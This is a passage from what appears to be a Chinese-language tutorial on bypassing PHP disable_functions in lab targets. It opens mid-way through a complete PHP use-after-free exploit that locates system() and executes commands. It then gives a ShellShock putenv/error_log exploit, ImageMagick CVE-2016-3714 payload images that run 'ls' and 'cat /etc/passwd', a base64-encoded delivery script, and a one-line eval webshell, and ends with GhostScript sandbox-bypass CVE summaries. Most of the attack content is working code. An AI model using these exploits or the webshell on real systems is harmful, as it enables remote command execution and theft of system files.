class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params">&amp;<span class="variable">$a</span>, <span class="variable">$address</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$s</span>;</span><br><span class="line">    i2s(<span class="variable">$a</span>, <span class="number">0x00</span>, <span class="variable">$address</span> - <span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">return</span> strlen(<span class="variable">$s</span> -&gt; current());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getPHPChunk</span>(<span class="params"><span class="variable">$maps</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$pattern</span> = <span class="string">&#x27;/([0-9a-f]+\-[0-9a-f]+) rw\-p 00000000 00:00 0 /&#x27;</span>;</span><br><span class="line">    preg_match_all(<span class="variable">$pattern</span>, <span class="variable">$maps</span>, <span class="variable">$match</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$match</span>[<span class="number">1</span>] <span class="keyword">as</span> <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$start</span>, <span class="variable">$end</span>) = explode(<span class="string">&quot;-&quot;</span>, <span class="variable">$value</span>);</span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$length</span> = s2i(hex2bin(<span class="variable">$end</span>)) - s2i(hex2bin(<span class="variable">$start</span>))) &gt;= <span class="number">0x200000</span> &amp;&amp; <span class="variable">$length</span> &lt;= <span class="number">0x300000</span>) &#123;</span><br><span class="line">            <span class="variable">$address</span> = <span class="keyword">array</span>(s2i(hex2bin(<span class="variable">$start</span>)), s2i(hex2bin(<span class="variable">$end</span>)), <span class="variable">$length</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;[+]PHP Chunk: &quot;</span> . <span class="variable">$start</span> . <span class="string">&quot; - &quot;</span> . <span class="variable">$end</span> . <span class="string">&quot;, length: 0x&quot;</span> . dechex(<span class="variable">$length</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bomb1</span>(<span class="params">&amp;<span class="variable">$a</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (leak(<span class="variable">$a</span>, s2i(<span class="variable">$_GET</span>[<span class="string">&quot;test1&quot;</span>])) === <span class="number">0x5454545454545454</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> (s2i(<span class="variable">$_GET</span>[<span class="string">&quot;test1&quot;</span>]) &amp; <span class="number">0x7ffff0000000</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;[!]Where is here&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bomb2</span>(<span class="params">&amp;<span class="variable">$a</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$start</span> = s2i(<span class="variable">$_GET</span>[<span class="string">&quot;test2&quot;</span>]);</span><br><span class="line">    <span class="keyword">return</span> getElement(<span class="variable">$a</span>, <span class="keyword">array</span>(<span class="variable">$start</span>, <span class="variable">$start</span> + <span class="number">0x200000</span>, <span class="number">0x200000</span>));</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;[!]Not Found&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getElement</span>(<span class="params">&amp;<span class="variable">$a</span>, <span class="variable">$address</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$x</span> = <span class="number">0</span>;<span class="variable">$x</span> &lt; (<span class="variable">$address</span>[<span class="number">2</span>] / <span class="number">0x1000</span> - <span class="number">2</span>);<span class="variable">$x</span>++) &#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="number">0x108</span> + <span class="variable">$address</span>[<span class="number">0</span>] + <span class="number">0x1000</span> * <span class="variable">$x</span> + <span class="number">0x1000</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>;<span class="variable">$y</span> &lt; <span class="number">5</span>;<span class="variable">$y</span>++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (leak(<span class="variable">$a</span>, <span class="variable">$addr</span> + <span class="variable">$y</span> * <span class="number">0x08</span>) === <span class="number">0x1234567812345678</span> &amp;&amp; ((leak(<span class="variable">$a</span>, <span class="variable">$addr</span> + <span class="variable">$y</span> * <span class="number">0x08</span> - <span class="number">0x08</span>) &amp; <span class="number">0xffffffff</span>) === <span class="number">0x01</span>))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;[+]SplDoublyLinkedList Element: &quot;</span> . dechex(<span class="variable">$addr</span> + <span class="variable">$y</span> * <span class="number">0x08</span> - <span class="number">0x18</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span> + <span class="variable">$y</span> * <span class="number">0x08</span> - <span class="number">0x18</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getClosureChunk</span>(<span class="params">&amp;<span class="variable">$a</span>, <span class="variable">$address</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="variable">$address</span> = leak(<span class="variable">$a</span>, <span class="variable">$address</span>);</span><br><span class="line">    &#125;<span class="keyword">while</span>(leak(<span class="variable">$a</span>, <span class="variable">$address</span>) !== <span class="number">0x00</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;[+]Closure Chunk: &quot;</span> . dechex(<span class="variable">$address</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getSystem</span>(<span class="params">&amp;<span class="variable">$a</span>, <span class="variable">$address</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$start</span> = <span class="variable">$address</span> &amp; <span class="number">0xffffffffffff0000</span>;</span><br><span class="line">    <span class="variable">$lowestAddr</span> = (<span class="variable">$address</span> &amp; <span class="number">0x0000fffffff00000</span>) - <span class="number">0x0000000001000000</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span> * <span class="number">0x80</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="variable">$i</span> * <span class="number">0x20</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$addr</span> &lt; <span class="variable">$lowestAddr</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$nameAddr</span> = leak(<span class="variable">$a</span>, <span class="variable">$addr</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$nameAddr</span> &gt; <span class="variable">$address</span> || <span class="variable">$nameAddr</span> &lt; <span class="variable">$lowestAddr</span>) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$name</span> = dechex(leak(<span class="variable">$a</span>, <span class="variable">$nameAddr</span>));</span><br><span class="line">        <span class="variable">$name</span> = str_pad(<span class="variable">$name</span>, <span class="number">16</span>, <span class="string">&quot;0&quot;</span>, STR_PAD_LEFT);</span><br><span class="line">        <span class="variable">$name</span> = strrev(hex2bin(<span class="variable">$name</span>));</span><br><span class="line">        <span class="variable">$name</span> = explode(<span class="string">&quot;\x00&quot;</span>, <span class="variable">$name</span>)[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$name</span> === <span class="string">&quot;system&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> leak(<span class="variable">$a</span>, <span class="variable">$addr</span> + <span class="number">0x08</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Trigger</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$s</span>;</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$s</span>[<span class="number">0</span>]);</span><br><span class="line">        <span class="variable">$a</span> = str_shuffle(str_repeat(<span class="string">&quot;T&quot;</span>, <span class="number">0xf</span>));</span><br><span class="line">        i2s(<span class="variable">$a</span>, <span class="number">0x00</span>, <span class="number">0x1234567812345678</span>);</span><br><span class="line">        i2s(<span class="variable">$a</span>, <span class="number">0x08</span>, <span class="number">0x04</span>, <span class="number">7</span>);</span><br><span class="line">        <span class="variable">$s</span> -&gt; current();</span><br><span class="line">        <span class="variable">$s</span> -&gt; next();</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$s</span> -&gt; current() !== <span class="number">0x1234567812345678</span>) &#123;</span><br><span class="line">             <span class="keyword">die</span>(<span class="string">&quot;[!]UAF Failed&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$maps</span> = file_get_contents(<span class="string">&quot;/proc/self/maps&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$maps</span>) &#123;</span><br><span class="line">            cantRead(<span class="variable">$a</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            canRead(<span class="variable">$maps</span>, <span class="variable">$a</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[+]Done&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bypass</span>(<span class="params"><span class="variable">$elementAddress</span>, &amp;<span class="variable">$a</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$s</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$closureChunkAddress</span> = getClosureChunk(<span class="variable">$a</span>, <span class="variable">$elementAddress</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;[!]Get Closure Chunk Address Failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$closure_object</span> = leak(<span class="variable">$a</span>, <span class="variable">$closureChunkAddress</span> + <span class="number">0x18</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;[+]Closure Object: &quot;</span> . dechex(<span class="variable">$closure_object</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="variable">$closure_handlers</span> = leak(<span class="variable">$a</span>, <span class="variable">$closure_object</span> + <span class="number">0x18</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;[+]Closure Handler: &quot;</span> . dechex(<span class="variable">$closure_handlers</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$system_address</span> = getSystem(<span class="variable">$a</span>, <span class="variable">$closure_handlers</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;[!]Couldn&#x27;t determine system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;[+]Find system&#x27;s handler: &quot;</span> . dechex(<span class="variable">$system_address</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    i2s(<span class="variable">$a</span>, <span class="number">0x08</span>, <span class="number">0x506</span>, <span class="number">7</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt; (<span class="number">0x130</span> / <span class="number">0x08</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$data</span> = leak(<span class="variable">$a</span>, <span class="variable">$closure_object</span> + <span class="number">0x08</span> * <span class="variable">$i</span>);</span><br><span class="line">        i2s(<span class="variable">$a</span>, <span class="number">0x00</span>, <span class="variable">$closure_object</span> + <span class="number">0x30</span>);</span><br><span class="line">        i2s(<span class="variable">$s</span> -&gt; current(), <span class="number">0x08</span> * <span class="variable">$i</span> + <span class="number">0x100</span>, <span class="variable">$data</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    i2s(<span class="variable">$a</span>, <span class="number">0x00</span>, <span class="variable">$closure_object</span> + <span class="number">0x30</span>);</span><br><span class="line">    i2s(<span class="variable">$s</span> -&gt; current(), <span class="number">0x20</span>, <span class="variable">$system_address</span>);</span><br><span class="line">    i2s(<span class="variable">$a</span>, <span class="number">0x00</span>, <span class="variable">$closure_object</span>);</span><br><span class="line">    i2s(<span class="variable">$a</span>, <span class="number">0x08</span>, <span class="number">0x108</span>, <span class="number">7</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;[+]Executing command: \n&quot;</span>;</span><br><span class="line">    (<span class="variable">$s</span> -&gt; current())(<span class="string">&quot;tac /flag&quot;</span>);        <span class="comment">// 可替换成需要执行的命令</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">canRead</span>(<span class="params"><span class="variable">$maps</span>, &amp;<span class="variable">$a</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$s</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$chunkAddress</span> = getPHPChunk(<span class="variable">$maps</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;[!]Get PHP Chunk Address Failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    i2s(<span class="variable">$a</span>, <span class="number">0x08</span>, <span class="number">0x06</span>, <span class="number">7</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$elementAddress</span> = getElement(<span class="variable">$a</span>, <span class="variable">$chunkAddress</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;[!]Get SplDoublyLinkedList Element Address Failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    bypass(<span class="variable">$elementAddress</span>, <span class="variable">$a</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cantRead</span>(<span class="params">&amp;<span class="variable">$a</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$s</span>;</span><br><span class="line">    i2s(<span class="variable">$a</span>, <span class="number">0x08</span>, <span class="number">0x06</span>, <span class="number">7</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;test1&quot;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;test2&quot;</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;[!]Please try to get address of PHP Chunk&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;test1&quot;</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(dechex(bomb1(<span class="variable">$a</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;test2&quot;</span>])) &#123;</span><br><span class="line">        <span class="variable">$elementAddress</span> = bomb2(<span class="variable">$a</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$elementAddress</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;[!]Get SplDoublyLinkedList Element Address Failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    bypass(<span class="variable">$elementAddress</span>, <span class="variable">$a</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> <span class="built_in">SplDoublyLinkedList</span>();</span><br><span class="line"><span class="variable">$s</span> -&gt; push(<span class="keyword">new</span> Trigger());</span><br><span class="line"><span class="variable">$s</span> -&gt; push(<span class="string">&quot;Twings&quot;</span>);</span><br><span class="line"><span class="variable">$s</span> -&gt; push(<span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;&#125;);</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$x</span> = <span class="number">0</span>;<span class="variable">$x</span> &lt; <span class="number">0x100</span>;<span class="variable">$x</span>++) &#123;</span><br><span class="line">    <span class="variable">$s</span> -&gt; push(<span class="number">0x1234567812345678</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$s</span> -&gt; rewind();</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$s</span>[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure>
<p>直接访问即可执行命令。</p>
<h2 id="利用-ShellShock-漏洞-CVE-2014-6271"><a href="#利用-ShellShock-漏洞-CVE-2014-6271" class="headerlink" title="利用 ShellShock 漏洞 (CVE-2014-6271)"></a>利用 ShellShock 漏洞 (CVE-2014-6271)</h2><p><strong>漏洞简介</strong>：</p>
<p>目前的bash使用的环境变量是通过函数名称来调用的，导致漏洞出问题是以“(){”开头定义的环境变量在命令ENV中解析成函数后，Bash执行并未退出，而是继续解析并执行shell命令。核心的原因在于在输入的过滤中没有严格限制边界，没有做合法化的参数判断。</p>
<p>攻击者只需将恶意代码写入到环境变量中，传到服务端，触发服务器运行bash脚本即可执行恶意代码。</p>
<blockquote>
<p>有关ShellShock漏洞（Bash破壳漏洞）的详细原理可以参考以下文章：</p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/35579956">https://zhuanlan.zhihu.com/p/35579956</a></p>
</blockquote>
<p><strong>漏洞利用条件</strong>：</p>
<ul>
<li><code>putenv</code>可用</li>
<li><code>mail</code> or <code>error_log</code> 可用，本例中禁用了 <code>mail</code> 但未禁用 <code>error_log</code></li>
<li><code>/bin/bash</code> 存在 <code>CVE-2014-6271</code> 漏洞</li>
<li><code>/bin/sh -&gt; /bin/bash</code> sh 默认的 shell 是 bash</li>
</ul>
<p><strong>存在shellshock漏洞的操作系统版本</strong>：</p>
<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2022/01/02/MnNUwVegPaGzO8d.png" alt="image-20220102001226416"></p>
<p><strong>靶场环境</strong>：</p>
<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/2">https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/2</a></p>
<p><strong>靶场环境的Bash版本</strong>：</p>
<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2022/01/02/8bG5wvsc6xp4K1S.png" alt="image-20220102213116419"></p>
<p><strong>靶场突破</strong>：</p>
<p>连接到webshell后，写入EXP：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">putenv(<span class="string">&quot;PHP_flag=() &#123; :; &#125;; tac /flag &gt; /var/www/html/flag.txt&quot;</span>);	<span class="comment"># 设置环境变量，将flag输入到flag.txt中</span></span><br><span class="line">error_log(<span class="string">&quot;a&quot;</span>,<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
<p>访问EXP，刷新后得到flag：</p>
<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2022/01/02/X6nPIeCtRaKyWHG.png" alt="image-20220102211012735"></p>
<h2 id="利用-ImageMagick-RCE-漏洞-CVE-2016-3714"><a href="#利用-ImageMagick-RCE-漏洞-CVE-2016-3714" class="headerlink" title="利用 ImageMagick RCE 漏洞 (CVE-2016-3714)"></a>利用 ImageMagick RCE 漏洞 (CVE-2016-3714)</h2><p><strong>漏洞简介</strong>：</p>
<p>ImageMagick是一款使用量很广的图片处理程序，支持 PHP、Ruby、NodeJS 和 Python 等多种语言，使用非常广泛。很多厂商都调用了这个程序进行图片处理，包括图片的伸缩、切割、水印、格式转换等等。但近来有研究者发现，当用户传入一个包含『畸形内容』的图片的时候，就有可能触发命令注入漏洞。</p>
<p>ImageMagick有一个功能叫做delegate（委托），作用是调用外部的lib来处理文件。而调用外部lib的过程是使用系统的system命令来执行的。首先在<code>delegate.xml</code>文件中，定义了很多占位符，比如<code>%i</code>是输入的文件名，<code>%l</code>是图片<code>exif label</code>信息，而在之后的<code>command</code>中，部分占位符被拼接在其中，被拼接完的<code>command</code>命令行传入了系统的system函数，导致任意命令执行。</p>
<blockquote>
<p>关于该漏洞的原理详解推荐参考P神的这篇文章：</p>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html">https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html</a></p>
</blockquote>
<p><strong>漏洞利用条件</strong>：</p>
<ul>
<li>目标主机安装了漏洞版本的ImageMagick(&lt;= 6.9.3-9)</li>
<li>安装了php-imagick扩展，并且在php.ini中启用</li>
<li>php &gt;=5.4</li>
</ul>
<blockquote>
<p>关于这个漏洞影响ImageMagick 6.9.3-9以前是所有版本，包括ubuntu源中安装的ImageMagick。而官方在6.9.3-9版本中对漏洞进行了不完全的修复。所以，我们不能仅通过更新ImageMagick的版本来杜绝这个漏洞。</p>
</blockquote>
<p><strong>靶场环境</strong>：</p>
<p>使用直接使用docker拉取靶场镜像：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker pull medicean/vulapps:i_imagemagick_1</span><br><span class="line"></span><br><span class="line">docker run -d -p 18081:80 --name=i_imagemagick_1 medicean/vulapps:i_imagemagick_1</span><br></pre></td></tr></table></figure>
<p>进入容器，并为靶场添加disable_functions，在php.ini中添加如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">disable_functions=pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,system</span><br></pre></td></tr></table></figure>
<p>然后重启apache服务</p>
<p>之后在靶场的web根目录中写入webshell</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;hacker&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>本地测试</strong>：</p>
<p>进入容器</p>
<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2022/01/08/EUb4DpMPOfxVz25.png" alt="image-20220108130501494"></p>
<p>在容器中 <code>/poc.png</code> 文件内容如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill &#x27;url(https://evalbug.com/&quot;|ls -la&quot;)&#x27;</span><br><span class="line">pop graphic-context</span><br></pre></td></tr></table></figure>
<p>构建时已经集成在容器中，可手动修改第 3 行的命令。</p>
<p>执行下面命令验证漏洞：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ convert /poc.png 1.png</span><br></pre></td></tr></table></figure>
<p>如果看到 <code>ls -al</code> 命令成功执行，则存在漏洞。</p>
<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2022/01/08/O3EuMvDVj86FhQ2.png" alt="image-20220108130716536"></p>
<p>同时除了<code>.mvg</code>格式的图片外，普通png的图片也能触发这个命令执行。</p>
<p>这是<code>delete</code>对<code>%l</code>，也就是<code>exif label</code>的处理：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;delegate decode=<span class="string">&quot;miff&quot;</span> encode=<span class="string">&quot;show&quot;</span> spawn=<span class="string">&quot;True&quot;</span> <span class="built_in">command</span>=<span class="string">&quot;&amp;quot;/usr/bin/display&amp;quot; -delay 0 -window-group %[group] -title &amp;quot;%l &amp;quot; &amp;quot;ephemeral:%i&amp;quot;&quot;</span>/&gt;</span><br></pre></td></tr></table></figure>
<p>将<code>%l</code>拼接到了<code>/usr/bin/display</code>命令中，所以现在就只需要将一个普通的png图片<strong>加上恶意的exif信息</strong>，然后在满足条件的情况下触发即可。</p>
<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2022/01/09/N7Y6txSjnlD2bgh.png" alt="image-20220109130012936"></p>
<blockquote>
<p>由于delegate.xml中设置了encode为show或者win，所以需要输出为.show或者.win的情况下才会调用该delegate（换句话说，也就是普通的文件处理不会触发这个命令）</p>
</blockquote>
<p><strong>靶场突破</strong>：</p>
<p>编写一个恶意的png文件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill &#x27;url(https://evalbug.com/&quot;|cat /etc/passwd &gt; t.txt&quot;)&#x27;</span><br><span class="line">pop graphic-context</span><br></pre></td></tr></table></figure>
<p>再对其进行base64编码</p>
<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2022/01/09/lrwkUTzs7PChcmI.png" alt="image-20220109132902955"></p>
<p>使用蚁剑连接WebShell，并上传如下EXP：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">readImageBlob</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$base64</span> = <span class="string">&quot;cHVzaCBncmFwaGljLWNvbnRleHQKdmlld2JveCAwIDAgNjQwIDQ4MApmaWxsICd1cmwoaHR0cHM6</span></span><br><span class="line"><span class="string">Ly9ldmFsYnVnLmNvbS8ifGNhdCAvZXRjL3Bhc3N3ZCA+IHQudHh0IiknCnBvcCBncmFwaGljLWNv</span></span><br><span class="line"><span class="string">bnRleHQK&quot;</span>;</span><br><span class="line">    <span class="variable">$imageBlob</span> = base64_decode(<span class="variable">$base64</span>);</span><br><span class="line">    <span class="variable">$imagick</span> = <span class="keyword">new</span> Imagick();</span><br><span class="line">    <span class="variable">$imagick</span>-&gt;readImageBlob(<span class="variable">$imageBlob</span>);</span><br><span class="line"></span><br><span class="line">    header(<span class="string">&quot;Content-Type: image/png&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$imageBlob</span>;</span><br><span class="line">&#125;</span><br><span class="line">readImageBlob();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>直接访问EXP即可执行命令</p>
<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2022/01/09/4WoXHZMFyKqG6Up.png" alt="image-20220109133516234"></p>
<h2 id="利用-GhostScript-沙箱绕过-RCE-漏洞"><a href="#利用-GhostScript-沙箱绕过-RCE-漏洞" class="headerlink" title="利用 GhostScript 沙箱绕过 RCE 漏洞"></a>利用 GhostScript 沙箱绕过 RCE 漏洞</h2><p><strong>漏洞简介</strong>：</p>
<p>GhostScript 被许多图片处理库所使用，如 ImageMagick、Python PIL 等，默认情况下这些库会根据图片的内容将其分发给不同的处理方法，其中就包括 GhostScript。</p>
<p><strong>CVE-2018-16509</strong>：8 月 21 号，Tavis Ormandy 通过公开邮件列表，再次指出 GhostScript 的安全沙箱可以被绕过，通过构造恶意的图片内容，将可以造成命令执行、文件读取、文件删除等漏洞：</p>
<p><strong>CVE-2018-19475</strong>：2018年底来自Semmle Security Research Team的Man Yue Mo发表了CVE-2018-16509漏洞的变体CVE-2018-19475，可以通过一个恶意图片绕过GhostScript的沙盒，进而在9.26以前版本的gs中执行任意命令。</p>
